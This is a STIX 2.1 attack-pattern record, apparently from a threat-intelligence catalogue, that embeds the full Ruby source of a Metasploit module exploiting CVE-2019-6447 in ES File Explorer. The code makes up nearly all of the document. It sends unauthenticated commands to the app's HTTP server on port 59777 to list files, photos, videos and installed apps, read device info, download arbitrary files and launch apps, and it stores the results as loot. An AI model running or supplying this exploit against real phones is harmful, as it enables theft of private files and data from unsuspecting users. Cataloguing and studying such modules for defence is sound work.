{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c2fac3d5-fa3b-4fe8-bd2c-378c14688dd9",
    "created": "2024-08-14T16:29:14.658571Z",
    "modified": "2024-08-14T16:29:14.658575Z",
    "name": "ES File Explorer Open Port",
    "description": " This module connects to ES File Explorer's HTTP server to run certain commands. The HTTP server is started on app launch, and is available as long as the app is open. Version 4.1.9.7.4 and below are reported vulnerable This module has been tested against 4.1.9.5.1.  'References'  => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/es_file_explorer_open_port.rb",
            "external_id": "es_file_explorer_open_port.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.ms509.com/2016/03/01/es-explorer-vul/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/fs0c131y/ESFileExplorerOpenPortVuln"
        },
        {
            "source_name": "reference",
            "url": "https://twitter.com/fs0c131y/status/1085460755313508352"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'        => 'ES File Explorer Open Port',\n      'Description' => %q{\n        This module connects to ES File Explorer's HTTP server to run\n        certain commands. The HTTP server is started on app launch, and is available\n        as long as the app is open. Version 4.1.9.7.4 and below are reported vulnerable\n        This module has been tested against 4.1.9.5.1.\n      },\n      'References'  =>\n        [\n          ['CVE', '2019-6447'],\n          ['URL', 'https://www.ms509.com/2016/03/01/es-explorer-vul/'],\n          ['URL', 'https://github.com/fs0c131y/ESFileExplorerOpenPortVuln'],\n          ['URL', 'https://twitter.com/fs0c131y/status/1085460755313508352'],\n        ],\n      'Author'      => [\n          '\u5c0f\u8377\u624d\u9732\u5c16\u5c16\u89d2', # discovery (2016)\n          'moonbocal', # discovery (2019)\n          'fs0c131y', # poc\n          'h00die' # msf module\n      ],\n      'DisclosureDate' => 'Jan 16 2019',\n      'License'     => MSF_LICENSE,\n      'Actions' => [\n        ['LISTFILES', 'Description' => 'List all the files on the sdcard'],\n        ['LISTPICS', 'Description' => 'List all the pictures'],\n        ['LISTVIDEOS', 'Description' => 'List all the videos'],\n        ['LISTAUDIOS', 'Description' => 'List all the audio files'],\n        ['LISTAPPS',   'Description' => 'List all the apps installed'],\n        ['LISTAPPSSYSTEM', 'Description' => 'List all the system apps installed'],\n        ['LISTAPPSPHONE', 'Description' => 'List all the phone apps installed'],\n        ['LISTAPPSSDCARD', 'Description' => 'List all the apk files stored on the sdcard'],\n        ['LISTAPPSALL', 'Description' => 'List all the apps installed'],\n        ['GETDEVICEINFO', 'Description' => 'Get device info'],\n        ['GETFILE', 'Description' => 'Get a file from the device. ACTIONITEM required.'],\n        ['APPLAUNCH', 'Description' => 'Launch an app. ACTIONITEM required.'],\n      ],\n      'DefaultAction' => 'GETDEVICEINFO',\n    )\n\n    register_options([\n      Opt::RPORT(59777),\n      OptString.new('ACTIONITEM', [false,'If an app or filename if required by the action']),\n    ])\n\n  end\n\n  def sanitize_json(j)\n    j.gsub!(\"},\\r\\n]\", \"}]\")\n    j.gsub!(\"'\", '\"')\n    return j.gsub('\", }', '\"}')\n  end\n\n  def http_post(command)\n    send_request_raw(\n      'uri' => '/',\n      'method' => 'POST',\n      'data' => \"{ \\\"command\\\":#{command} }\",\n      'ctype' => 'application/json',\n    )\n  end\n\n  def run_host(target_host)\n    case\n      when action.name == 'LISTFILES'\n        res = http_post('listFiles')\n        unless res\n          print_error(\"#{peer}- Error Connecting\")\n          return\n        end\n        unless res.code == 200\n          print_error(\"#{peer}- Not Vulnerable or Bad Response\")\n          return\n        end\n        path = store_loot('listFiles.json', 'application/json', target_host, res.body, 'es_file_explorer_listfiles.json')\n        vprint_good(\"#{peer}- Result saved to #{path}\")\n        json_resp = JSON.parse(sanitize_json(res.body))\n        pretty_response = \"#{peer}\\n\"\n        json_resp.each do |f|\n          pretty_response << \"  #{f['type']}: #{f['name']} (#{f['size'].split(' (')[0]}) - #{f['time']}\\n\"\n        end\n        print_good(pretty_response)\n      when action.name == 'LISTPICS'\n        res = http_post('listPics')\n        unless res\n          print_error(\"#{peer}- Error Connecting\")\n          return\n        end\n        unless res.code == 200\n          print_error(\"#{peer}- Not Vulnerable or Bad Response\")\n          return\n        end\n        path = store_loot('listPics.json', 'application/json', target_host, res.body, 'es_file_explorer_listpics.json')\n        vprint_good(\"#{peer}- Result saved to #{path}\")\n        json_resp = JSON.parse(sanitize_json(res.body))\n        pretty_response = \"#{peer}\\n\"\n        json_resp.each do |f|\n          pretty_response << \"  #{f['name']} (#{f['size'].split(' (')[0]}) - #{f['time']}: #{f['location']}\\n\"\n        end\n        print_good(pretty_response)\n      when action.name == 'LISTVIDEOS'\n        res = http_post('listVideos')\n        unless res\n          print_error(\"#{peer}- Error Connecting\")\n          return\n        end\n        unless res.code == 200\n          print_error(\"#{peer}- Not Vulnerable or Bad Response\")\n          return\n        end\n        path = store_loot('listVideos.json', 'application/json', target_host, res.body, 'es_file_explorer_listvideos.json')\n        vprint_good(\"#{peer}- Result saved to #{path}\")\n        json_resp = JSON.parse(sanitize_json(res.body))\n        pretty_response = \"#{peer}\\n\"\n        json_resp.each do |f|\n          pretty_response << \"  #{f['name']} (#{f['size'].split(' (')[0]}) - #{f['time']}: #{f['location']}\\n\"\n        end\n        print_good(pretty_response)\n      when action.name == 'LISTAUDIOS'\n        res = http_post('listAudios')\n        unless res\n          print_error(\"#{peer}- Error Connecting\")\n          return\n        end\n        unless res.code == 200\n          print_error(\"#{peer}- Not Vulnerable or Bad Response\")\n          return\n        end\n        path = store_loot('listAudio.json', 'application/json', target_host, res.body, 'es_file_explorer_listaudio.json')\n        vprint_good(\"#{peer}- Result saved to #{path}\")\n        json_resp = JSON.parse(sanitize_json(res.body))\n        pretty_response = \"#{peer}\\n\"\n        json_resp.each do |f|\n          pretty_response << \"  #{f['name']} (#{f['size'].split(' (')[0]}) - #{f['time']}: #{f['location']}\\n\"\n        end\n        print_good(pretty_response)\n      when action.name == 'LISTAPPS'\n        res = http_post('listApps')\n        unless res\n          print_error(\"#{peer}- Error Connecting\")\n          return\n        end\n        unless res.code == 200\n          print_error(\"#{peer}- Not Vulnerable or Bad Response\")\n          return\n        end\n        path = store_loot('listApps.json', 'application/json', target_host, res.body, 'es_file_explorer_listapps.json')\n        vprint_good(\"#{peer}- Result saved to #{path}\")\n        json_resp = JSON.parse(sanitize_json(res.body))\n        pretty_response = \"#{peer}\\n\"\n        json_resp.each do |f|\n          pretty_response << \"  #{f['label']} (#{f['packageName']}) Version: #{f['version']}\\n\"\n        end\n        print_good(pretty_response)\n      when action.name == 'LISTAPPSSYSTEM'\n        res = http_post('listAppsSystem')\n        unless res\n          print_error(\"#{peer}- Error Connecting\")\n          return\n        end\n        unless res.code == 200\n          print_error(\"#{peer}- Not Vulnerable or Bad Response\")\n          return\n        end\n        path = store_loot('listAppsSystem.json', 'application/json', target_host, res.body, 'es_file_explorer_listappssystem.json')\n        vprint_good(\"#{peer}- Result saved to #{path}\")\n        json_resp = JSON.parse(sanitize_json(res.body))\n        pretty_response = \"#{peer}\\n\"\n        json_resp.each do |f|\n          pretty_response << \"  #{f['label']} (#{f['packageName']}) Version: #{f['version']}\\n\"\n        end\n        print_good(pretty_response)\n      when action.name == 'LISTAPPSPHONE'\n        res = http_post('listAppsPhone')\n        unless res\n          print_error(\"#{peer}- Error Connecting\")\n          return\n        end\n        unless res.code == 200\n          print_error(\"#{peer}- Not Vulnerable or Bad Response\")\n          return\n        end\n        path = store_loot('listAppsPhone.json', 'application/json', target_host, res.body, 'es_file_explorer_listappsphone.json')\n        vprint_good(\"#{peer}- Result saved to #{path}\")\n        json_resp = JSON.parse(sanitize_json(res.body))\n        pretty_response = \"#{peer}\\n\"\n        json_resp.each do |f|\n          pretty_response << \"  #{f['label']} (#{f['packageName']}) Version: #{f['version']}\\n\"\n        end\n        print_good(pretty_response)\n      when action.name == 'LISTAPPSSDCARD'\n        res = http_post('listAppsSdcard')\n        unless res\n          print_error(\"#{peer}- Error Connecting\")\n          return\n        end\n        unless res.code == 200\n          print_error(\"#{peer}- Not Vulnerable or Bad Response\")\n          return\n        end\n        path = store_loot('listAppsSdcard.json', 'application/json', target_host, res.body, 'es_file_explorer_listappssdcard.json')\n        vprint_good(\"#{peer}- Result saved to #{path}\")\n        json_resp = JSON.parse(sanitize_json(res.body))\n        pretty_response = \"#{peer}\\n\"\n        json_resp.each do |f|\n          pretty_response << \"  #{f['label']} (#{f['packageName']}) Version: #{f['version']}\\n\"\n        end\n        print_good(pretty_response)\n      when action.name == 'LISTAPPSALL'\n        res = http_post('listAppsAll')\n        unless res\n          print_error(\"#{peer}- Error Connecting\")\n          return\n        end\n        unless res.code == 200\n          print_error(\"#{peer}- Not Vulnerable or Bad Response\")\n          return\n        end\n        path = store_loot('listAppsAll.json', 'application/json', target_host, res.body, 'es_file_explorer_listappsall.json')\n        vprint_good(\"#{peer}- Result saved to #{path}\")\n        json_resp = JSON.parse(sanitize_json(res.body))\n        pretty_response = \"#{peer}\\n\"\n        json_resp.each do |f|\n          pretty_response << \"  #{f['label']} (#{f['packageName']}) Version: #{f['version']}\\n\"\n        end\n        print_good(pretty_response)\n      when action.name == 'GETDEVICEINFO'\n        res = http_post('getDeviceInfo')\n        unless res\n          print_error(\"#{peer}- Error Connecting\")\n          return\n        end\n        unless res.code == 200\n          print_error(\"#{peer}- Not Vulnerable or Bad Response\")\n          return\n        end\n        path = store_loot('getDeviceInfo.json', 'application/json', target_host, res.body, 'es_file_explorer_getdeviceinfo.json')\n        vprint_good(\"#{peer}- Result saved to #{path}\")\n        json_resp = JSON.parse(sanitize_json(res.body))\n        print_good(\"#{peer}- Name: #{json_resp['name']}\")\n      when action.name == 'GETFILE'\n        unless datastore['ACTIONITEM'].start_with?('/')\n          print_error('Action item is a path for GETFILE, like /system/app/Browser.apk')\n        end\n        res = send_request_raw(\n          'uri' => datastore['ACTIONITEM'],\n          'method' => 'GET',\n          'ctype' => 'application/json',\n        )\n        unless res\n          print_error(\"#{peer}- Error Connecting\")\n          return\n        end\n        unless res.code == 200\n          print_error(\"#{peer}- Not Vulnerable, Bad Response.  File may not be available for download.\")\n          return\n        end\n        path = store_loot('getFile', 'application/octet-stream', target_host, res.body, datastore['ACTIONITEM'])\n        print_good(\"#{peer}- #{datastore['ACTIONITEM']} saved to #{path}\")\n      when action.name == 'APPLAUNCH'\n        if datastore['ACTIONITEM'].empty?\n          print_error('Action item is a path for GETFILE, like com.android.chrome')\n        end\n        res = send_request_raw(\n          'uri' => '/',\n          'method' => 'POST',\n          'data' => \"{ \\\"command\\\":appLaunch, \\\"appPackageName\\\":#{datastore['ACTIONITEM']} }\",\n          'ctype' => 'application/json',\n        )\n        unless res\n          print_error(\"#{peer}- Error Connecting\")\n          return\n        end\n        unless res.code == 200\n          print_error(\"#{peer}- Not Vulnerable, Bad Response.  File may not be available for download.\")\n          return\n        end\n        if res.body.include?('NameNotFoundException')\n          print_error(\"#{peer}- Application #{datastore['ACTIONITEM']} not found on device\")\n          return\n        elsif res.body.include?('{\"result\":\"0\"}')\n          print_good(\"#{peer}- #{datastore['actionitem']} launched successfully\")\n        end\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "Jan 16 2019"
}